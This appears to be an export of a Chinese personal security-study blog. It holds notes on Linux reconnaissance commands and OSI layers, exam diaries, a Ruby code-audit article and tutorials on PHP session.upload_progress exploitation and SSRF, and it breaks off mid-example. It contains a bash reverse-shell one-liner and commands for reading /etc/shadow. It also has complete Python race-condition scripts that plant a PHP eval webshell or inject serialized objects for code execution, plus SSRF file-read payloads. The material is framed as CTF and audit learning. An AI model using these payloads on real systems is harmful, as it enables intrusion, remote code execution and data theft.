已用户为主的格式(u)显示所有用户(a)的所有终端机(x)下的所有进程\ntop: 类似Windows的任务管理器\n\ncat /etc/passwd: 可以登录系统或其他拥有正在运行的进程的操作系统的用户身份信息\ncat /etc/shadow: 所有用户的密码安全策略,一般只有超级用户对此文件夹才有访问权限!\ncat /etc/sudoers: 对权限的分配管理   \nifconfig -a: 查看网络、网卡相关信息\nhostname: 显示、设置系统的主机名称\n反弹shellbash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1\n\n\n\nOSI模型应用层：为应用程序或用户请求提供各种请求服务。OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。\n表示层：数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。\n会话层：创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。\n传输层：数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。\n网络层：IP选址及路由选择。通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进&#x2F;出路由等控制，将信息从一个网络设备传送到另一个网络设备。\n数据链路层：提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。\n物理层：管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。\nTCP&#x2F;IP五层模型区别TCP&#x2F;IP协议中的应用层处理开放式系统互联模型（OSI）中的第五层、第六层和第七层的功能。\nTCP&#x2F;IP协议中的传输层不能保证数据包在该层总是能够安全可靠地传输，而开放式系统互联模型（OSI）可以做到。\nTCP&#x2F;IP协议还提供一项名为UDP（用户数据报协议）的选择。\nxss，csrf，ssrf区别相同点： XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。\n不同点： XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。\nCSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  \nSSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器\n","categories":["学习"]},{"title":"考研日记04-10","url":"/2024/04/10/2024_4_10/","content":"2024 4 10学习时间\n7h14min\n\nMATH\n第六讲基础过完，习题未写 p124\n\nENGLISH\n才30个… 慢慢增加吧\n\n408\n将队列过了一遍，并将之前的题目做完了，跟着b站的一些解析对之前不懂的地方逐步了解了\n\n杂记今天状态挺不错的，早上还是有时候会赖床，然后每天12点之前必须睡觉\n现在每天疑惑的地方是对记单词的时间没有一个较好的规划，这几天对英语单词做一个好的规划！\n","categories":["考研"]},{"title":"考研日记04-11","url":"/2024/04/11/2024_4_11/","content":"2024 4 11学习时间\n8h26min\n\nMATH\n定积分基本概念过完 p148（题未写）\n\nENGLISH\n没有背。。。真的要改一改了！晚上回去一定背！\n\n408\n第三章基本完结，需要看一下习题的讲解 p112\n\n杂记最近在用番茄todo记录学时间，感觉最近的状态也越来越好了，希望能坚持下去。\n每天好好利用时间，不要浪费时间。\n最近的屏幕每日使用时长也慢慢降下来了，希望以后能降低到4h（包括记单词的1h）\n最近感慨挺多，不过也算是一个好的开始了吧，想想我的考研正式开始也是清明节后面了，一分一秒我都不能浪费！（好怕英语没过国家线，怕也没用)\n\n","categories":["考研"]},{"title":"Ruby安全初探","url":"/2023/05/02/Ruby%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2/","content":"Ruby安全漫谈随着Ruby越来越流行，Ruby相关的安全问题也逐渐暴露，目前，国内专门介绍Ruby安全的文章较少，本文结合笔者所了解的Ruby安全知识点以及挖掘到的Ruby相关漏洞进行描述，希望能给读者在Ruby代码审计上提供帮助。\nRuby简介Ruby是一种面向对象、指令式、函数式、动态的通用编程语言。在20世纪90年代中期由日本电脑科学家松本行弘（Matz）设计并开发。Ruby注重简洁和效率，句法优雅，读起来自然，写起来舒适。\n红宝石安全说到Ruby安全不得不提RubyonRails安全，本篇着重关注Ruby本身。Ruby涉及到web安全漏洞几乎囊括其他语言存在的漏洞，例如命令注入漏洞、代码注入漏洞、反序列化漏洞、SQL注入漏洞、XSS漏洞、SSRF漏洞等。但是在具体的漏洞触发上，Ruby又不同于其他语言。\n命令注入漏洞命令注入漏洞一般是指把外部数据传入system类的函数执行，导致命令注入漏洞。触发命令注入漏洞的链接符号有很多，再配合单双引号可以组合成更多不同的注入条件，例如（linux）：\n\n``\n$\n;\n|\n&amp;\n\\n\n\n在审计代码的时候一般会直接搜索能够执行命令的函数，例如：\n\n波彭\n生成\nsyscall\n系统\nexec\n开盘3.*\n\n而对于Ruby，除了支持这些函数执行命令，还有一些独特执行命令的方式：\n\n%x&#x2F;&#x2F;\n``\n打开\nIO.read\nIO.write\nIO.binread\nIO.binwrite\nIO.foreach\nIO.readlines\n\n%x&#x2F;&#x2F;和’’属于类似system函数，可以把字符串解析为命令：\n  \nopen是Ruby用来操作文件的函数，但是他也支持执行命令，执行传入一个以中划线开头的字符，后面跟着要执行的命令即可：\n  \n除了open函数，IO.read&#x2F;IO.write&#x2F;IO.binread&#x2F;IO.binwrite&#x2F;IO.foreach&#x2F;IO.readlines函数也可以以相同的方式执行命令。\nopen函数引发的Ruby安全问题：\nFile.read函数引发的Ruby安全问题：\nIO.readlines函数引发的潜在Ruby安全问题，笔者发现，已被忽略：\n代码注入漏洞代码注入漏洞一般是由于把外部数据传入eval类函数中执行，导致程序可以执行任意代码。Ruby除了支持eval，还支持class_eval、instance_eval函数执行代码，区别在于执行代码的上下文环境不同。eval函数导致的代码注入问题与其他语言类似，不再赘述。\nRuby除了eval、class_eval、instance_eval函数，还存在其他可以执行代码的函数：\n\n发送\n__send__\npublic_send\nconst_get\nconstantize\n\nsend函数send函数是Ruby用来调用符号方法的函数，可以将任何指定的参数传递给它，类似JAVA中的invoke函数，不过它更为灵活，可以接收外部变量，举例：\n\n上述代码中，实例k通过send动态调用了hello办法，假如hello字符串来自外部，便可以传入eval，注入恶意代码，举例：\n\n__send__函数__send__函数和send函数一样，区别在于当代码有send同名函数时，可以调用__send__。\npublic_send函数public_send和send函数的区别在于send可以调用私有方法。\nsend函数引发的Ruby安全问题：\n搜索一些不安全的用法：\n\nconst_get函数const_get函数是Ruby用来在模块中获取常量值的函数，它存在一个inherit参数，当设置为true时（默认也为true），会递归向祖先模块查找。它还有另外一个用法，就是当字符串是已载入的类名时，会返回这个类（Ruby中，类名也是常量），类似JAVA的forName函数，常用写法是这样：\n\n代码中，使用const_get动态实例化了类，使Ruby更为灵活。但是这样的用法如果使用不当，也会出现安全问题，例如这里（rack-proxy模块）：\n\n如图，perform_request函数在Net：：HTTP模块中搜索HTTP方法类，然后实例化，并传递full_path请求路径参数给new函数，HTTP方法和请求路径都是外部可控的，而且const_get函数没有限制inherit，默认可以递归查找，在整个空间内实例化任意已载入类，并传递一个可控参数。如果找到合适的利用链，完全可以到达任意代码执行。目前，该问题已在GitHub上被发现并修复。\n\n实战中已经有人使用此方法实现了代码执行，那就是gitlab的一个漏洞\nhttps://hackerone.com/reports/1125425， kramdown模块使用const_get函数来动态实例化格式化类，但是没有限制inherit，导致vakzz通过使用一个Redis类的利用链达到了任意代码执行的目的，漏洞报告已经写的非常详细，不再赘述。\nconstantizeconstantize同样可以将字符串转化为类，属于RubyonRails中的用法，底层调用的const_get函数：\n\n下图中constantize要转化的类和类实例化的参数都可控，如果我们能找到合适的利用链，便可以到达任意代码执行：\n反序列化漏洞反序列化漏洞是指在把外部传入的不可信字节序列恢复为对象的过程中，未做合适校验，导致攻击者可以利用特定方法，配合利用链，达到任意代码执行的目的。Ruby也有反序列化的函数，同样也存在反序列化漏洞。\n元帅反序列化Marshal是Ruby用来序列反序列化的模块，Marshal.dump可以把一个对象序列化为字节序，Marshal.load可以把一个字节序反序列化为对象。\nMarshal反序列化的利用已有很多篇分析文章，不再赘述。\n\nlhttps://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\n\n使用已经公开的POC测试：\n\n执行POC（ruby-3.0.0）：\n\n搜索一些不安全的用法：\n\nJSON反序列化Ruby 处理JSON时可能存在反序列化漏洞，但是不是Ruby内置的JSON解析器，而是第三方开发的解析器oj（https://github.com/ohler55/oj）。oj在解析JSON时支持多种数据类型，包括会导致代码执行的Object类型。\n使用已经公开的POC测试：\n\n执行POC（ruby-3.0.0）：\n\noj可以通过设置模式，避免反序列化对象：\n\nYAML反序列化Ruby YAML也支持反序列化对象，pysch 4.0之前版本调用YAML.load函数即可反序列化对象，psych 4.0以后需要调用YAML.unsafe_load才能反序列化对象。使用已经公开的POC测试：\n\n执行POC（ruby-3.0.0）：\n  \nRuby YAML解析，psych4.0之前可以通过调用save_load函数，避免反序列化对象，psych 4.0之后默认load函数就是安全的（https://github.com/ruby/psych/pull/487）。\n搜索unsafe_load的使用，不一定存在漏洞，需要yaml内容可控才有风险：\n  \n正则错用Ruby正则大体与其他语言一样，只是在个别语法上存在差别，如果没有特别了解研究，按照其他的语言用法套用，就很有可能出现安全问题，例如Ruby在用正则匹配开头和结尾时支持^$的用法，但是支持多行匹配则需要改为\\A\\Z避免换行绕过。\n  \n正则错用引发的安全问题：\n搜索相关代码，还是有不少错用的：\n  \nFUZZ Ruby解析器在学习Ruby反序列化时，想要通过Ruby用C语言实现Marshal，对处理不同数据类型做处理，那么可以对他进行一下FUZZ。\nFUZZ使用了AFLplusplus，配置编译Ruby：\n\n.&#x2F;configure CC&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast++ –disable-install-doc –disable-install-rdoc –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ruby –enable-debug-env\n导出ASAN_OPTIONS&#x3D;“detect_leaks&#x3D;0：abort_on_error&#x3D;1：allow_user_segv_handler&#x3D;0：handle_abort&#x3D;1：符号&#x3D;0”\nAFL_USE_ASAN&#x3D;1\n\n使用AFLplusplus的deferred instrumentation模式，对Ruby源码main.c文件稍作修改：\n\n样本生成上，可以选取Ruby自带的测试用例，这样可以快速得到比较全面合法的样本，正好在学习Ruby hook的方案，写了一个简单的hook函数，在rubygems.rb文件中加载，劫持Marshal模块，执行自测的同时即可保存下样本。\n  \n想要FUZZ其他模块也可以用同样办法来获取样本。\n经过一段时间的FUZZ，陆陆续续发现了一些漏洞：\n1. CVE-2022-28738 在onig_reg_resize中双自由\n  \n2. CVE-2022-28739 strtod 中的堆缓冲区溢出\n  \n3. 全局缓冲区溢出calc_tm_yday\n  \n4. renumber_by_map中的动态堆栈缓冲区溢出\n  \n5. JSON.parse 拒绝服务\n  \n虽然FUZZ出了一些问题，但是依旧存在很多未解决的问题，比如FUZZ速度、效率、自动化等，未来将继续深入探索研究。\n以上是笔者在ruby中的一些学习研究汇总，如有不恰当之处，敬请斧正，一起交流学习。\n参考链接\nhttps://hackerone.com/ruby/hacktivity\nhttps://bishopfox.com/blog/ruby-vulnerabilities-exploits\nhttps://zenn.dev/ooooooo\\_q/books/rails\\_deserialize\nhttp://gavinmiller.io/2016/the-safesty-way-to-constantize/\nhttps://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\nhttps://www.elttam.com/blog/ruby-deserialization/\nhttps://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\nhttps://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\n\n","categories":["学习"]},{"title":"session反序列化","url":"/2023/02/13/%E5%88%A9%E7%94%A8session.upload_progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B8%97%E9%80%8F%20/","content":"前言本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。\nphp中的session.upload_progress这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。\n在php.ini有以下几个默认选项\n1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;\n\n其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。\n\nenabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；\ncleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；\nname当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；\nprefix+name将表示为session中的键名\n\nsession相关配置及session反序列化因为这个不是本文的重点，所以这里附上几个相关链接。\n\nhttps://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html\nhttps://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral\n\n另外，再添加个session配置中一个重要选项。\nsession.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。\n利用session.upload_progress进行文件包含利用测试环境\nphp5.5.38\nwin10\n关于session相关的一切配置都是默认值\n\n示例代码&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt;\n\n可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用session.upload_progress将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。\n分析问题一\n代码里没有session_start(),如何创建session文件呢。\n解答一\n其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。\n但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。\n问题二\n但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，\n如何进行rce呢？\n解答二\n此时我们可以利用竞争，在session文件内容清空前进行包含利用。\n利用脚本#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session):    while True:        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session):    while True:        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)        if &#x27;tgao.txt&#x27; in resp.text:            print(resp.text)            event.clear()        else:            print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;:    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\n\n效果如下图\n\nctf题目在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。\n&lt;html&gt;    &lt;?php    error_reporting(0);    $file = $_GET[&quot;file&quot;];    $payload = $_GET[&quot;payload&quot;];    if(!isset($file))&#123;        echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;    &#125;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&#x27;hack attacked!!!&#x27;);    &#125;    @include($file);    if(isset($payload))&#123;        $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);        parse_str($url[&#x27;query&#x27;],$query);        foreach($query as $value)&#123;            if (preg_match(&quot;/flag/&quot;,$value)) &#123;                die(&#x27;stop hacking!&#x27;);                exit();            &#125;        &#125;        $payload = unserialize($payload);    &#125;else&#123;       echo &quot;Missing parameters&quot;;    &#125;    ?&gt;    &lt;!--Please test index.php?file=xxx.php --&gt;    &lt;!--Please get the source of hint.php--&gt;    &lt;/html&gt;\n\n在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量$file加了过滤，不过没什么影响。\n利用思路一样，这里就不再说了，网上也有相应的解法。\n小结利用条件\n\n1. 存在文件包含漏洞\n2. 知道session文件存放路径，可以尝试默认路径\n3. 具有读取和写入session文件的权限\n\n利用session.upload_progress进行反序列化攻击测试环境\nphp5.5.38\nwin10\nsession.serialize_handler=php_serialize，其余session相关配置为默认值\n\n示例代码&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle=new TimeNow();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;?&gt;\n\n分析问题一\n整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢\n解答一\n这里，利用PHP_SESSION_UPLOAD_PROGRESS上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。\n另外，与文件包含利用一样，也需要进行竞争。\n利用脚本首先利用exp.php脚本构造恶意序列化语句\n&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle = new IP();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;你的访问时间:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        //$this-&gt;ip=&#x27;payload&#x27;;        $this-&gt;ip=&#x27;phpinfo();&#x27;;        //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt;\n\n其此利用exp.py脚本进行竞争\n#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1)    while True:        et.wait()        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27;        headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,        &#x27;DNT&#x27;: &#x27;1&#x27;,        &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;,        &#x27;Connection&#x27;: &#x27;close&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;        &#125;        proxy = &#123;        &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;        &#125;        data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125;        files=&#123;            &#x27;file&#x27;:(r&#x27;|O:4:\\&quot;Door\\&quot;:1:&#123;s:6:\\&quot;handle\\&quot;;O:2:\\&quot;IP\\&quot;:1:&#123;s:2:\\&quot;ip\\&quot;;s:10:\\&quot;phpinfo();\\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=&quot;utf-8&quot;        if len(resp.text)&lt;2000:            print(&#x27;[+++++]retry&#x27;)        else:            print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))            et.clear()            print(&#x27;success!&#x27;)            if __name__ == &quot;__main__&quot;:    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()\n\n首先在代码里加个代理，利用burp抓包。如下图\n\n这里有几个注意点：\n\nPHPSESSID必须要有，因为要竞争同一个文件\nfilename可控，但是在值的最前面加上|,因为最终目的是利用session的反序列化，PHP_SESSION_UPLOAD_PROGRESS只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突\n上传的文件要大些，否则很难竞争成功。我写入是这么大f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)\nfilename值中出现汉字时，会出错，所以在利用脚本前，一定要修改python源码\n\n最后把exp.py中的代理去掉，直接跑exp.py,效果如下。\n\n几次失败尝试\n其实，利用burp抓到exp.py流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。\n另外，我尝试伪造PHP_SESSION_UPLOAD_PROGRESS的值，但是值中一旦出现|，将会导致数据写入session文件失败。\n\n小结利用条件主要是存在session反序列化漏洞。\n从文件包含和反序列化两个利用点，可以发现，利用PHP_SESSION_UPLOAD_PROGRESS可以绕过大部分过滤，而且传输的数据也不易发现。\n","categories":["学习"]},{"title":"SSRF初探","url":"/2022/05/17/SSRF%E5%88%9D%E6%8E%A2/","content":"\n\nFreeBuf停更好久，我都忘了自己还有一个FreeBuf账号了，嘿嘿，你们信吗？\n\n在最近一段时间的CTF中，感觉SSRF的题型又多了起来。SSRF这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下SSRF的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。\n漏洞详情SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。\nSSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。\n如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。\n容易出现SSRF的地方有：\n\n\n社交分享功能：获取超链接的标题等内容进行显示\n\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n在线翻译：给网址翻译对应网页的内容\n\n图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片\n\n图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验\n\n云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试\n\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n\n数据库内置功能：数据库的比如mongodb的copyDatabase函数\n\n邮件系统：比如接收邮件服务器地址\n\n编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等\n\n未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……\n\n从远程服务器请求资源\n\n\n\nSSRF漏洞的危害：\n\n\n对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。\n\n攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。\n\n对内网Web应用进行指纹识别，识别企业内部的资产信息。\n\n攻击内外网的Web应用，主要是使用HTTP GET&#x2F;POST请求就可以实现的攻击，如sql注入、文件上传等。\n\n利用file协议读取服务器本地文件等。\n\n进行跳板攻击等。\n\n\n\nSSRF漏洞相关函数和类\nfile_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。\n\nreadfile()：输出一个文件的内容。\n\nfsockopen()：打开一个网络连接或者一个Unix 套接字连接。\n\ncurl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。\n\nfopen()：打开一个文件文件或者 URL。\n\n……\n\n\n上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。\nfile_get_contents()测试代码：\n// ssrf.php&lt;?php$url = $\\_GET\\[&#x27;url&#x27;\\];;echo file\\_get\\_contents($url);?&gt;\n\n上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似ssrf.php?url=../../../../../etc/passwd的paylaod即可读取服务器本地的任意文件。\n\nreadfile()函数与file_get_contents()函数相似。\nfsockopen()fsockopen($hostname,$port,$errno,$errstr,$timeout)用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。\n测试代码：\n// ssrf.php&lt;?php$host=$\\_GET\\[&#x27;url&#x27;\\];$fp = fsockopen($host, 80, $errno, $errstr, 30);if (!$fp) &#123;    echo &quot;$errstr ($errno)&lt;br /&gt;\\\\n&quot;;&#125; else &#123;    $out = &quot;GET / HTTP/1.1\\\\r\\\\n&quot;;    $out .= &quot;Host: $host\\\\r\\\\n&quot;;    $out .= &quot;Connection: Close\\\\r\\\\n\\\\r\\\\n&quot;;    fwrite($fp, $out);    while (!feof($fp)) &#123;        echo fgets($fp, 128);    &#125;    fclose($fp);&#125;?&gt;\n\n构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：\n\ncurl_exec()curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。\n测试代码：\n// ssrf.php&lt;?php if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;\t$link = $\\_GET\\[&#x27;url&#x27;\\];\t$curlobj = curl\\_init(); // 创建新的 cURL 资源\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源\n\n\n\n// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n\n}?&gt;\n构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：\n\nSoapClientSOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。\nSoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的__call方法，那么__call便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：\npublic SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n\n第一个参数是用来指明是否是wsdl模式。\n\n第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。\n\n\n知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：\n// 